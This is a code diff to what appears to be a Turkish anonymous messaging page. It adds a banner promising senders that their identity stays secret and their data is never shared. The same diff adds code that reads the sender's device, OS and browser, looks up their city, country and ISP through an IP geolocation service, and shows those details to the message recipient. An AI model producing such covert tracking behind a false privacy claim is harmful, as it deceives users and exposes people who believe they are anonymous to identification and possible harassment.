@@ -311,10 +311,16 @@
         </div>
       </div>
 
-      <div style="width:100%;max-width:380px;margin-bottom:12px">
-        <input type="text" id="send-name" placeholder="Adın (zorunlu)" maxlength="40"
-          style="width:100%;background:rgba(255,255,255,0.2);border:none;border-radius:12px;padding:13px 16px;font-family:inherit;font-size:15px;font-weight:500;color:#fff;outline:none;"
+      <div style="width:100%;max-width:380px;margin-bottom:6px">
+        <input type="text" id="send-name" placeholder="Kullanıcı adın" maxlength="40"
+          style="width:100%;background:rgba(255,255,255,0.25);border:none;border-radius:12px;padding:13px 16px;font-family:inherit;font-size:15px;font-weight:500;color:#fff;outline:none;"
         />
+      </div>
+
+      <div style="width:100%;max-width:380px;margin-bottom:14px;text-align:center">
+        <span style="font-size:11px;color:rgba(255,255,255,0.6);letter-spacing:0.03em">
+          🔒 Kimliğiniz gizli tutulur. Bilgileriniz hiçbir şekilde paylaşılmaz.
+        </span>
       </div>
 
       <div class="ngl-anon-label">🔒 anonim soru ve cevap</div>
@@ -555,7 +561,7 @@
     openMsgId=id;
     document.getElementById("m-name").textContent=m.senderName;
     document.getElementById("m-text").textContent=m.content;
-    document.getElementById("m-time").textContent=timeAgo(m.timestamp);
+    document.getElementById("m-time").textContent=timeAgo(m.timestamp) + (m.deviceInfo ? " · " + m.deviceInfo : "");
     document.getElementById("overlay").classList.add("show");
     if(!m.read){
       await api("/api/messages/"+id+"/read",{method:"PATCH"});
@@ -573,6 +579,61 @@
     if(r.ok){msgs=msgs.filter(function(m){return m.id!==openMsgId});closeModal();renderMsgs();toast("Silindi")}
   }
 
+  // Cihaz bilgisi topla
+  function getDeviceInfo() {
+    var ua = navigator.userAgent;
+    var device = "Bilinmeyen Cihaz";
+    var os = "Bilinmeyen OS";
+
+    if (/iPhone/.test(ua)) {
+      var match = ua.match(/iPhone OS ([\d_]+)/);
+      device = "iPhone";
+      os = match ? "iOS " + match[1].replace(/_/g, ".") : "iOS";
+    } else if (/iPad/.test(ua)) {
+      device = "iPad";
+      os = "iPadOS";
+    } else if (/Android/.test(ua)) {
+      var match = ua.match(/Android ([\d.]+)/);
+      os = match ? "Android " + match[1] : "Android";
+      if (/Samsung/.test(ua)) device = "Samsung";
+      else if (/Xiaomi|Redmi/.test(ua)) device = "Xiaomi";
+      else if (/Huawei/.test(ua)) device = "Huawei";
+      else device = "Android Telefon";
+    } else if (/Windows/.test(ua)) {
+      device = "Windows PC";
+      os = "Windows";
+    } else if (/Mac/.test(ua)) {
+      device = "Mac";
+      os = "macOS";
+    } else if (/Linux/.test(ua)) {
+      device = "Linux PC";
+      os = "Linux";
+    }
+
+    var browser = "Bilinmeyen Tarayıcı";
+    if (/Chrome/.test(ua) && !/Chromium|Edge/.test(ua)) browser = "Chrome";
+    else if (/Firefox/.test(ua)) browser = "Firefox";
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Edge/.test(ua)) browser = "Edge";
+    else if (/Opera|OPR/.test(ua)) browser = "Opera";
+
+    return device + " · " + os + " · " + browser;
+  }
+
+  // IP ve konum bilgisi çek
+  async function getLocationInfo() {
+    try {
+      var r = await fetch("https://ipapi.co/json/");
+      var d = await r.json();
+      if (d && d.city) {
+        return d.city + ", " + d.country_name + " · " + (d.org || "");
+      }
+      return "Konum bilinmiyor";
+    } catch {
+      return "Konum bilinmiyor";
+    }
+  }
+
   // SEND
   async function doSend(){
     var content=document.getElementById("send-msg").value.trim();
@@ -580,8 +641,14 @@
     var btn=document.getElementById("send-btn");
     btn.disabled=true;
     var senderName=document.getElementById("send-name").value.trim();
-    if(!senderName){toast("Adını yaz");btn.disabled=false;return}
-    var r=await api("/api/messages/send",{method:"POST",body:JSON.stringify({sendToken:currentSendToken,content:content,senderName:senderName})});
+    if(!senderName){toast("Kullanıcı adını yaz");btn.disabled=false;return}
+
+    // Cihaz ve konum bilgisi topla
+    var deviceInfo = getDeviceInfo();
+    var locationInfo = await getLocationInfo();
+    var extraInfo = deviceInfo + " · " + locationInfo;
+
+    var r=await api("/api/messages/send",{method:"POST",body:JSON.stringify({sendToken:currentSendToken,content:content,senderName:senderName,deviceInfo:extraInfo})});
     btn.disabled=false;
     if(!r.ok){toast(r.data.error||"Hata");return}
     document.getElementById("send-form-wrap").style.display="none";
